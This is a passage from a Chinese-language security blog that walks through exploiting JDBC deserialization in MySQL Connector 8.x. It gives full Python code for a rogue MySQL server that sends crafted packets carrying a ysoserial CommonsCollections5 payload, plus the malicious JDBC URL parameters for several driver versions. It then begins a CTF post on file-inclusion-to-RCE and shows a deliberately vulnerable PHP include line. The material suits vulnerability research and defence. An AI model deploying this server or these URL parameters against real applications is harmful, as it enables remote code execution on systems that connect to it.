<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> import socket</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line"># 对应第一个问候数据包，当监听到连接之后，发送给客户端</span><br><span class="line">GreetingInfo = &quot;4a0000000a382e302e31320013000000080c16437d1a144000ffffc00200ffc31500000000000000000000203c5f03322d4f4863566101006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="line"></span><br><span class="line">login1 = &quot;0700000200000002000000&quot;</span><br><span class="line"></span><br><span class="line"># 用户发送账号和密码后，验证成功的返回数据包</span><br><span class="line">loginValid = &quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span><br><span class="line"></span><br><span class="line">resCharset = &quot;0700000100000002000000&quot;</span><br><span class="line"></span><br><span class="line">resAutoCommit = &quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def startServer():</span><br><span class="line">    serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">    serverSocket.bind((&quot;0.0.0.0&quot;,3306))</span><br><span class="line">    serverSocket.listen(1)</span><br><span class="line">    print(&quot;Start Fake Server:&#123;&#125;:&#123;&#125;&quot;.format(&quot;0.0.0.0&quot;,&quot;3306&quot;))</span><br><span class="line">    while True:</span><br><span class="line">        # 获取到数据之后，开始进行交互</span><br><span class="line">        conn,addr = serverSocket.accept()</span><br><span class="line"></span><br><span class="line">        conn.send(binascii.a2b_hex(GreetingInfo))</span><br><span class="line">        while True:</span><br><span class="line">            data = conn.recv(1024)</span><br><span class="line">            print(&quot;接收到数据：&#123;&#125;&quot;.format(data))</span><br><span class="line">            # login验证</span><br><span class="line">            if b&quot;mysql_native_password&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(login1))</span><br><span class="line">            elif b&quot;auto_increment_increment&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(loginValid))</span><br><span class="line">            elif b&quot;character_set_results&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resCharset))</span><br><span class="line">            elif b&quot;session.autocommit&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resAutoCommit))</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    startServer()</span><br></pre></td></tr></table></figure>

<p>​    然后使用<code>jdbc</code>来进行连接，可以查看到客户端最后发送了一个<code>SHOW SESSION STATUS</code>的查询：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113131216243.png" alt="image-20220113131216243"></p>
<p>​    根据前面的介绍，<code>SHOW SESSION STATUS</code>查询过后，如果能够执行<code>byte[] data = getBytes(columnIndex);</code>，<code>data</code>的值最后的结果为<code>Aborted_clients</code>，我们查找一下这个字符串，然后根据上面的分析，修改一下长度以及字符串内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># show session status返回值构造</span><br><span class="line">part1 = &quot;0100000102&quot;</span><br><span class="line">part2 = &quot;4c00000203646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730d5661726961626c655f6e616d650d5661726961626c655f6e616d650cff0000010000fd0110000000&quot;</span><br><span class="line">part3 = &quot;3c00000303646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730556616c75650556616c75650cff0000100000fd0000000000&quot;</span><br><span class="line"># part4就是我们想要构造部分，主要需要修改前三个字节、第5个字节以及中间的41626f727465645f636c69656e7473这个部分</span><br><span class="line"># 第五个字节表示构造字符串的长度，前三个字节表示的长度从第5个字节开始算起</span><br><span class="line">tmpPart4 = &quot;120000040f41626f727465645f636c69656e74730139&quot;</span><br><span class="line">part4 = &quot;090000&quot; + &quot;0406&quot; + &quot;6d31736e3077&quot; + &quot;0139&quot;</span><br><span class="line">part5 = &quot;070000b3fe000002000000&quot;</span><br><span class="line">resPayload = part1 + part2 + part3 + part4 + part5</span><br></pre></td></tr></table></figure>

<p>​    关键就在于修改上面的<code>part4</code>，需要修改前三个字节，第5个字节，以及想要构造的<code>payload</code>，按照上面的构造完成之后，通过调试可以发现，最后的值替换成了<code>m1sn0w</code>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113134413031.png" alt="image-20220113134413031"></p>
<p>​    接下来开始正式构造<code>POC</code>，也就是我们需要开始控制条件语句，让其最终能够执行到<code>byte[] data = getBytes(columnIndex);</code>，并调用<code>readObject</code>方法，回到最终调用的<code>getObject</code>方法中：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113143110175.png" alt="image-20220113143110175"></p>
<p>​    这里有三个主要的条件需要我们进行控制。第一个是获取的字段的<code>mysql</code>类型必须为<code>BIT</code>，关于<code>BIT</code>的描述：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * BIT[(M)]</span><br><span class="line"> * A bit-field type. M indicates the number of bits per value, from 1 to 64. The default is 1 if M is omitted.</span><br><span class="line"> * Protocol: FIELD_TYPE_BIT = 16</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>

<p>​    前面在描述第二个序列的时候，有介绍到<code>fd</code>这个值，表示的就是<code>varchar</code>类型，我们查看一下官方文档，即<code>10</code>对应的就是<code>BIT</code>类型。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113135808743.png" alt="image-20220113135808743"></p>
<p>​    因此在最后构造<code>POC</code>的时候，只需要将<code>part2</code>后面的<code>fd</code>更改为<code>10</code>即可执行这个条件语句：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113142408784.png" alt="image-20220113142408784"></p>
<p>​    第二个绕过部分为<code>autoDeserialize</code>，只需要设置<code>URL</code>参数为<code>autoDeserialize=true</code>即可。第三个部分就是判断我们构造的<code>payload</code>数据前两个字节是否为<code>-84</code>和<code>-19</code>，这其实就是序列化数据的标志。因此，最后的<code>POC</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import binascii</span><br><span class="line"># 对应第一个问候数据包，当监听到连接之后，发送给客户端</span><br><span class="line">GreetingInfo = &quot;4a0000000a382e302e31320013000000080c16437d1a144000ffffc00200ffc31500000000000000000000203c5f03322d4f4863566101006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="line"></span><br><span class="line">login1 = &quot;0700000200000002000000&quot;</span><br><span class="line"></span><br><span class="line"># 用户发送账号和密码后，验证成功的返回数据包</span><br><span class="line">loginValid = &quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span><br><span class="line"></span><br><span class="line">resCharset = &quot;0700000100000002000000&quot;</span><br><span class="line"></span><br><span class="line">resAutoCommit = &quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span><br><span class="line"></span><br><span class="line"># show session status返回值构造</span><br><span class="line">part1 = &quot;0100000102&quot;</span><br><span class="line"># part2 = &quot;4c00000203646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730d5661726961626c655f6e616d650d5661726961626c655f6e616d650cff0000010000fd0110000000&quot;</span><br><span class="line">part2 = &quot;4c00000203646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730d5661726961626c655f6e616d650d5661726961626c655f6e616d650cff0000010000100110000000&quot;</span><br><span class="line">part3 = &quot;3c00000303646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730556616c75650556616c75650cff0000100000fd0000000000&quot;</span><br><span class="line"></span><br><span class="line"># part4就是我们想要构造部分，主要需要修改前三个字节、第5个字节以及中间的41626f727465645f636c69656e7473这个部分</span><br><span class="line"># 第五个字节表示构造字符串的长度，前三个字节表示的长度从第5个字节开始算起</span><br><span class="line">tmpPart4 = &quot;120000040f41626f727465645f636c69656e74730139&quot;</span><br><span class="line">part4 = &quot;090000&quot; + &quot;04&quot; + &quot;payload长度&quot; + &quot;payload&quot; + &quot;0139&quot;</span><br><span class="line">part5 = &quot;070000b3fe000002000000&quot;</span><br><span class="line">resPayload = part1 + part2 + part3 + part4 + part5</span><br><span class="line"></span><br><span class="line">def startServer():</span><br><span class="line">    serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">    serverSocket.bind((&quot;0.0.0.0&quot;,3306))</span><br><span class="line">    serverSocket.listen(1)</span><br><span class="line">    print(&quot;Start Fake Server:&#123;&#125;:&#123;&#125;&quot;.format(&quot;0.0.0.0&quot;,&quot;3306&quot;))</span><br><span class="line">    while True:</span><br><span class="line">        # 获取到数据之后，开始进行交互</span><br><span class="line">        conn,addr = serverSocket.accept()</span><br><span class="line"></span><br><span class="line">        conn.send(binascii.a2b_hex(GreetingInfo))</span><br><span class="line">        while True:</span><br><span class="line">            data = conn.recv(1024)</span><br><span class="line">            print(&quot;接收到数据：&#123;&#125;&quot;.format(data))</span><br><span class="line">            # login验证</span><br><span class="line">            if b&quot;mysql_native_password&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(login1))</span><br><span class="line">            elif b&quot;auto_increment_increment&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(loginValid))</span><br><span class="line">            elif b&quot;character_set_results&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resCharset))</span><br><span class="line">            elif b&quot;session.autocommit&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resAutoCommit))</span><br><span class="line">            elif b&quot;SHOW SESSION STATUS&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resPayload))</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    startServer()</span><br></pre></td></tr></table></figure>

<p>（这里有个坑，就是上面介绍<code>payload</code>前面那个字节表示<code>payload</code>的长度，如果说<code>payload</code>过长，需要两个或者多个字节来表示长度的话，就需要在前面加上一个<code>fc</code>）</p>
<p>​    验证漏洞的话，我导入一个<code>commons-collection3.1</code>，利用<code>ysoserial</code>生成<code>payload</code>，确定长度后即可进行攻击了（这里选用了<code>CommonsCollections5</code>）：（代码有点乱，但是大致思路就是这样）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line"># 对应第一个问候数据包，当监听到连接之后，发送给客户端</span><br><span class="line">GreetingInfo = &quot;4a0000000a382e302e31320013000000080c16437d1a144000ffffc00200ffc31500000000000000000000203c5f03322d4f4863566101006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="line"></span><br><span class="line">login1 = &quot;0700000200000002000000&quot;</span><br><span class="line"></span><br><span class="line"># 用户发送账号和密码后，验证成功的返回数据包</span><br><span class="line">loginValid = &quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span><br><span class="line"></span><br><span class="line">resCharset = &quot;0700000100000002000000&quot;</span><br><span class="line"></span><br><span class="line">resAutoCommit = &quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span><br><span class="line"></span><br><span class="line"># show session status返回值构造</span><br><span class="line">part1 = &quot;0100000102&quot;</span><br><span class="line"># part2 = &quot;4c00000203646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730d5661726961626c655f6e616d650d5661726961626c655f6e616d650cff0000010000fd0110000000&quot;</span><br><span class="line">part2 = &quot;2a00000203646566047465737404746573740474657374046e616d65046e616d650c3f00ffff0000fc9000000000&quot;</span><br><span class="line">part3 = &quot;2c000003036465660474657374047465737404746573740576616c75650576616c75650c3f00ffff0000fc9000000000&quot;</span><br><span class="line"></span><br><span class="line"># part4就是我们想要构造部分，主要需要修改前三个字节、第5个字节以及中间的41626f727465645f636c69656e7473这个部分</span><br><span class="line"># 第五个字节表示构造字符串的长度，前三个字节表示的长度从第5个字节开始算起</span><br><span class="line">with open(&quot;poc&quot;,&quot;rb&quot;) as file:</span><br><span class="line">    payload = binascii.b2a_hex(file.read())</span><br><span class="line">tmpPart4 = &quot;120000040f41626f727465645f636c69656e74730139&quot;</span><br><span class="line"></span><br><span class="line">part4 = &quot;220800&quot; + &quot;04&quot; + &quot;fc1d08&quot; + payload.decode(&#x27;utf-8&#x27;) + &quot;0139&quot;</span><br><span class="line"></span><br><span class="line">part5 = &quot;07000005fe000022000100&quot;</span><br><span class="line">resPayload = part1 + part2 + part3 + part4 + part5</span><br><span class="line"></span><br><span class="line">final = &quot;0700000100000002000000&quot;</span><br><span class="line"></span><br><span class="line">warn = &quot;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&quot;</span><br><span class="line">def startServer():</span><br><span class="line">    serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">    serverSocket.bind((&quot;0.0.0.0&quot;,3306))</span><br><span class="line">    serverSocket.listen(1)</span><br><span class="line">    print(&quot;Start Fake Server:&#123;&#125;:&#123;&#125;&quot;.format(&quot;0.0.0.0&quot;,&quot;3306&quot;))</span><br><span class="line">    while True:</span><br><span class="line">        # 获取到数据之后，开始进行交互</span><br><span class="line">        conn,addr = serverSocket.accept()</span><br><span class="line"></span><br><span class="line">        conn.send(binascii.a2b_hex(GreetingInfo))</span><br><span class="line">        while True:</span><br><span class="line">            data = conn.recv(1024)</span><br><span class="line">            print(&quot;接收到数据：&#123;&#125;&quot;.format(data))</span><br><span class="line">            # login验证</span><br><span class="line">            if b&quot;mysql_native_password&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(login1))</span><br><span class="line">            elif b&quot;auto_increment_increment&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(loginValid))</span><br><span class="line">            elif b&quot;character_set_results&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resCharset))</span><br><span class="line">            elif b&quot;session.autocommit&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resAutoCommit))</span><br><span class="line">            elif b&quot;SHOW SESSION STATUS&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resPayload))</span><br><span class="line">            elif b&quot;AUTO&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(final))</span><br><span class="line">            elif b&quot;WARNINGS&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(warn))</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    startServer()</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113212542880.png" alt="image-20220113212542880"></p>
<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>​    本文主要分析了<code>mysql8.x</code>环境下的反序列化漏洞的利用，漏洞利用点就在于<code>jdbc</code>的<code>URL</code>可控，然后我们构造<code>autoDeserialize</code>和<code>queryInterceptors</code>，让其远程连接<code>Fake Mysql</code>，最终触发了反序列化。本文用到的<code>URL</code>为：<code>jdbc:mysql://127.0.0.1:3306/test?useSSL=false&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;serverTimezone=UTC</code>。这里设置<code>useSSL=false</code>主要是为了方便抓取<code>mysql</code>数据包进行分析。</p>
<p>​    当然，在不同的<code>mysql</code>版本下，利用的方式稍微有一点点不同，但是大致原理是类似，这里就不再进行分析了。下面贴一个不同版本下<code>jdbc</code>反序列化漏洞的利用方式：（有兴趣的师傅自己研究吧）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 6.x版本下需要设置的参数</span><br><span class="line">autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br><span class="line"></span><br><span class="line"># 5.1.11及以上的5.x版本</span><br><span class="line">autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span><br><span class="line"></span><br><span class="line"># 5.1.29-5.1.40</span><br><span class="line">detectCustomCollations=true&amp;autoDeserialize=true</span><br><span class="line"></span><br><span class="line"># 5.1.28-5.1.19</span><br><span class="line">autoDeserialize=true</span><br></pre></td></tr></table></figure>

<h2 id="六、参考文章"><a href="#六、参考文章" class="headerlink" title="六、参考文章"></a>六、参考文章</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&POC%E7%BC%96%E5%86%99/" data-id="cl8h2gj9d000bfgdp5k17gox7" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-HXP CTF 2021文件包含到RCE技巧学习" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/07/HXP%20CTF%202021%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B0RCE%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time datetime="2022-01-07T02:48:26.000Z" itemprop="datePublished">2022-01-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/01/07/HXP%20CTF%202021%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B0RCE%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/">HXP CTF 2021文件包含到RCE技巧学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="HXP-CTF-2021-文件包含到RCE技巧学习"><a href="#HXP-CTF-2021-文件包含到RCE技巧学习" class="headerlink" title="HXP CTF 2021 文件包含到RCE技巧学习"></a><code>HXP CTF 2021</code> 文件包含到<code>RCE</code>技巧学习</h1><p>​    最新看到两个通过文件包含来<code>RCE</code>的题目，感觉挺有意思的。继<code>pearcmd</code>后的另外一种利用方式。简单记录一下。</p>
<h2 id="Trick-1：Nginx客户端主体缓冲区利用"><a href="#Trick-1：Nginx客户端主体缓冲区利用" class="headerlink" title="Trick 1：Nginx客户端主体缓冲区利用"></a>Trick 1：<code>Nginx</code>客户端主体缓冲区利用</h2><p>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include_once($_GET[&#x27;file&#x27;]);</span><br></pre></td></tr></table></figure>

